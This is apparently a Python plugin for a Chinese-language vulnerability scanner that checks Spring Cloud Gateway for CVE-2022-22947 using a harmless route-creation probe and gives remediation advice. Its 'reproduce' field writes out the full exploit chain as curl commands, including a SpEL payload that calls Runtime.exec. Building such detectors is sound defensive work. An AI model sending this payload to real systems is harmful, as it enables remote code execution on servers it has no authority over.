# CVE-2022-22947 Spring Cloud Gateway 远程代码执行
# 漏洞原因：Actuator 暴露 /gateway/routes/ 端点，可 POST 创建含恶意 Filter 的路由触发
#   SPEL 表达式求值执行任意命令（影响 Spring Cloud Gateway 3.1.x）。
# 本插件仅做存在性验证：POST 创建测试路由探针，检测响应特征判定接口是否可达。
from core.http import join_url
from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.colors import no, ok
from lib.matcher import match_gateway_route_created
from plugins.base import PluginBase

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
GW_MARKER = "spring-gateway-rce-confirmed"


class SpringGatewayRcePlugin(PluginBase):
    name = "CVE-2022-22947 Spring Cloud Gateway 远程代码执行"
    cve = "CVE-2022-22947"
    severity = "high"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    category = "vuln"
    description = "Actuator /gateway/routes/ 端点可匿名创建路由，SPEL Filter 求值触发 RCE"
    fix = "升级 Spring Cloud Gateway 至 3.1.1+ / 3.0.7+；为 Actuator 端点配置认证"
    fix_detail = (
        "【升级方案】pom.xml 升级 Spring Cloud Gateway：\n"
        "  3.1.x -> 3.1.1+\n"
        "  3.0.x -> 3.0.7+\n"
        "【配置加固】application.yml 收敛 Actuator 端点暴露：\n"
        "  management.endpoints.web.exposure.include: health,info\n"
        "  management.endpoints.web.exposure.exclude: gateway  # 禁用 gateway 端点\n"
        "【SecurityConfig】为 gateway 端点配置角色：\n"
        '  .antMatchers("/actuator/gateway/**").hasRole("ADMIN")\n'
        "【代码修复】禁止 SPEL 在 Filter args 中求值，改用字面量配置\n"
        "【WAF 规则】拦截外网对 /actuator/gateway/routes/ 的 POST 创建请求\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制"
    )
    reproduce = (
        "# 1. 探测 Gateway Actuator 端点：\n"
        'curl -i "http://target/actuator/gateway/routes"\n'
        "\n"
        "# 2. 创建含恶意 SPEL Filter 的路由（CVE-2022-22947）：\n"
        'curl -X POST "http://target/actuator/gateway/routes/test" \\\n'
        '  -H "Content-Type: application/json" \\\n'
        '  -d \'{"id":"test","filters":[{"name":"AddResponseHeader","args":{"name":"X-Test","value":"#{T(java.lang.Runtime).getRuntime().exec(\\"id\\")}"}}],"uri":"http://localhost:1","order":0}\'\n'
        "\n"
        "# 3. 刷新路由配置使 SPEL 生效：\n"
        'curl -X POST "http://target/actuator/gateway/refresh"\n'
        "\n"
        "# 4. 触发路由访问执行 SPEL：\n"
        'curl "http://target/test"\n'
        "\n"
        "# 5. 清理测试路由：\n"
        'curl -X DELETE "http://target/actuator/gateway/routes/test"\n'
        "\n"
        "# 预期响应：POST 返回 201 Created 即路由可创建，漏洞存在"
    )

    def verify(self, target, session):
        url = join_url(target, "/actuator/gateway/routes/test")
        # 路由创建探针（仅触发接口签名，不执行真实 SPEL）
        payload = {
            "id": "test-route-probe",
            "filters": [{"name": "AddResponseHeader", "args": {"name": "X-Probe", "value": "c22947"}}],
            "uri": "http://localhost:1",
            "order": 0,
        }
        try:
            resp = session.post(url, json=payload)
        except Exception as e:
            print(no("Spring Cloud Gateway RCE（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        if GW_MARKER in text:
            print(ok("存在 CVE-2022-22947 Spring Cloud Gateway 远程代码执行漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"响应含 Gateway RCE 特征：{GW_MARKER}",
                fix=self.fix,
            )
        # 真实漏洞响应：路由创建成功（201 Created + 路由信息）
        if resp.status_code in (200, 201) and match_gateway_route_created(text):
            print(ok("存在 CVE-2022-22947 Spring Cloud Gateway 远程代码执行漏洞（真实漏洞响应）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 Gateway 路由创建成功特征（filters/predicate），证实 Gateway 路由可创建",
                fix=self.fix,
            )
        print(no("不存在 CVE-2022-22947 Spring Cloud Gateway 远程代码执行漏洞"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            status=STATUS_SAFE,
            url=url,
            evidence="响应未含 Gateway RCE 特征（端点不可达或已修复）",
        )
